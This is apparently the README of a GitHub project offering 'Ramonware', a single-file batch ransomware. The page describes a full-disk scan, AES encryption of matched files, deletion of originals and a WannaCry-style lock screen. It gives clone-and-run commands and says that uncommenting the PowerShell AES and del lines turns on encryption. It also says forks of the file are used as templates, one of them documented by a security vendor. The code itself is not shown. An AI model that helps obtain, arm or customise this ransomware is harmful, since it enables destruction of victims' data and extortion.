Hi, I'm a ransomware code in batch my name is Ramon

I built Ramonware as an experiment as a minimum ransomware. You get a disk scan and AES on the matched files. The same .bat then opens a fullscreen HTA lock screen. People copy this file as a template and customize it... Trend Micro published a write-up on one of those forks: https://www.trendmicro.com/vinfo/us/threat-encyclopedia/malware/trojan.bat.ramonware.thjoebc


## Features

- Lock screen: opens a fullscreen HTA with a WannaCry-style note after the scan.

- Single file: `code/Ramonware.bat` holds the scan and the HTML. No extra install.

## Quick Start & Information

```shell
git clone https://github.com/SegoCode/Ramonware
cd Ramonware/code
Ramonware.bat
```

The scan starts at `%homedrive%\` and walks every folder.
Uncommenting the PowerShell AES lines and `del` encrypts the file and removes the original.
